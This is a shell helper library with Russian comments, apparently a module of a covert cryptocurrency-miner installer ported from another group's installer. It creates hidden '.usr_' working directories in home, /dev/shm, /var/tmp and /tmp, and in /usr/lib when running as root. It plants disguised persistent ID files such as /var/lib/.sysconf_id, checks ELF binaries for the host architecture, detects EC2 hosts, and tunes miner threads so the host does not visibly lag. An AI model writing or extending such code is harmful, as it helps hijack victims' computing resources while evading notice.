#!/bin/sh
# 00-common.sh — база: лог, каталоги, архитектура, счётчик ядер.
# Порт соответствующих мест theirs/installer.sh.

kf_log() { [ -n "${KF_QUIET:-}" ] || echo "[kf] $*"; }

kf_uid() { id -u 2>/dev/null || echo 0; }

# рабочий каталог: 6 кандидатов + проверка реального exec (как _find_good_workdir)
kf_find_workdir() {
  _w_sfx="${1:-$KF_SFX}"
  _w_bases=""
  if [ -n "${HOME:-}" ] && [ "$HOME" != "/" ] && [ -w "$HOME" ] 2>/dev/null; then
    _w_bases="$_w_bases $HOME/.cache/.usr_$_w_sfx $HOME/.config/.usr_$_w_sfx $HOME/.usr_$_w_sfx"
  fi
  _w_bases="$_w_bases /dev/shm/.usr_$_w_sfx /var/tmp/.usr_$_w_sfx /tmp/.usr_$_w_sfx"
  [ "$(kf_uid)" -eq 0 ] && _w_bases="$_w_bases /usr/lib/.usr_$_w_sfx"

  for _w_b in $_w_bases; do
    mkdir -p "$_w_b" 2>/dev/null || continue
    [ -w "$_w_b" ] || continue
    printf '#!/bin/sh\nexit 3\n' > "$_w_b/.exectest" 2>/dev/null || { rm -f "$_w_b/.exectest"; continue; }
    chmod 700 "$_w_b/.exectest" 2>/dev/null
    if "$_w_b/.exectest" 2>/dev/null; then
      rm -f "$_w_b/.exectest" 2>/dev/null
      printf '%s' "$_w_b"
      return 0
    fi
    rm -f "$_w_b/.exectest" 2>/dev/null
  done
  _w_fb="/var/tmp/.usr_$_w_sfx"
  mkdir -p "$_w_fb" 2>/dev/null || _w_fb="/tmp/.usr_$_w_sfx"
  mkdir -p "$_w_fb" 2>/dev/null
  printf '%s' "$_w_fb"
}

# каталог состояния
kf_state_dir() {
  for _s_c in "${KF_STATE_HOME:-}" "${KF_STATE_HOME:+$KF_STATE_HOME/.cache}" /var/tmp /tmp /dev/shm; do
    [ -n "$_s_c" ] || continue
    mkdir -p "$_s_c" 2>/dev/null || continue
    [ -w "$_s_c" ] && { printf '%s' "$_s_c"; return 0; }
  done
  return 1
}

# ядра
kf_cpu_count() {
  if [ -r /proc/cpuinfo ]; then
    grep -c '^processor' /proc/cpuinfo 2>/dev/null
  else
    sysctl -n hw.ncpu 2>/dev/null || nproc 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1
  fi
}

kf_is_ec2() { hostname 2>/dev/null | grep -qi -e ec2 -e compute; }

# архитектура и проверка ELF (как set_arch_urls / _is_elf_for_arch)
kf_arch() {
  _a=$(uname -m 2>/dev/null || echo unknown)
  case "$_a" in
    x86_64|amd64)   echo "x86_64 3e00" ;;
    aarch64|arm64|armv8l) echo "aarch64 b700" ;;
    armv7l|armv6l)  echo "armv7 2800" ;;
    *) echo "unknown" ;;
  esac
}

kf_elf_machine() { od -An -tx1 -j18 -N2 "$1" 2>/dev/null | tr -d '[:space:]'; }

kf_is_elf_for_arch() {
  _e_f="$1"; _e_m="$2"
  [ -s "$_e_f" ] || return 1
  [ "$(head -c 4 "$_e_f" 2>/dev/null)" = "$(printf '\177ELF')" ] || return 1
  [ "$(od -An -tx1 -j4 -N2 "$_e_f" 2>/dev/null | tr -d '[:space:]')" = "0201" ] || return 1
  [ "$(kf_elf_machine "$_e_f")" = "$_e_m" ]
}

# потоки по числу ядер: берём половину vCPU (физические ядра), как принято у майнеров.
# Их политика жёстче: на хостах <=3 ядер они вообще не ставят майнер, а на 4+ дают все ядра.
kf_threads_for_cores() {
  _t_c="${1:-1}"
  # 90 % потолок: оставляем ~10 % ядер свободными, чтобы хост не лагал
  _t_n=$(( _t_c * 9 / 10 ))
  [ "$_t_n" -lt 1 ] && _t_n=1
  [ "$_t_n" -gt 72 ] && _t_n=72
  echo "$_t_n"
}

# процент для справки и для их совместимости
kf_hint_for_cores() {
  _h_c="${1:-1}"
  case "$_h_c" in
    1|2) echo 100 ;; 3|4) echo 75 ;; 5|6|7|8) echo 60 ;;
    *) echo 50 ;;
  esac
}

# --- постоянный суффикс: переживает рестарт (их _sfx_path / _load_or_gen_sfx) --
kf_sfx_path() {
  if [ "$(kf_uid)" -eq 0 ]; then printf '/var/lib/.sysconf_id'
  elif [ -n "${HOME:-}" ] && [ -d "$HOME" ] && [ -w "$HOME" ]; then printf '%s/.sysid' "$HOME"
  else printf '/tmp/.sysid'; fi
}

kf_load_or_gen_sfx() {
  _x_f=$(kf_sfx_path)
  if [ -s "$_x_f" ]; then cat "$_x_f" 2>/dev/null; return 0; fi
  _x_s=$(tr -dc 'a-z0-9' < /dev/urandom 2>/dev/null | head -c4)
  [ -n "$_x_s" ] || _x_s=$(printf '%04x' $$ 2>/dev/null || echo 0001)
  mkdir -p "$(dirname "$_x_f")" 2>/dev/null
  printf '%s' "$_x_s" > "$_x_f" 2>/dev/null
  chmod 600 "$_x_f" 2>/dev/null
  printf '%s' "$_x_s"
}

# --- их _tool: выполнить команду и отметить её в логе ------------------------
kf_tool() {
  [ -n "${KF_QUIET:-}" ] || echo "[tool] $*" >&2
  "$@"
}

# --- их cron_log: отдельный лог для cron-полосы -----------------------------
kf_cron_log() {
  _cl="${KF_CRON_LOG:-${KF_ROOT:-/var/tmp/.kf}/.cron.log}"
  mkdir -p "$(dirname "$_cl")" 2>/dev/null
  printf '[cron %s] %s\n' "$(date '+%F %T' 2>/dev/null || echo -)" "$*" >> "$_cl" 2>/dev/null
  return 0
}
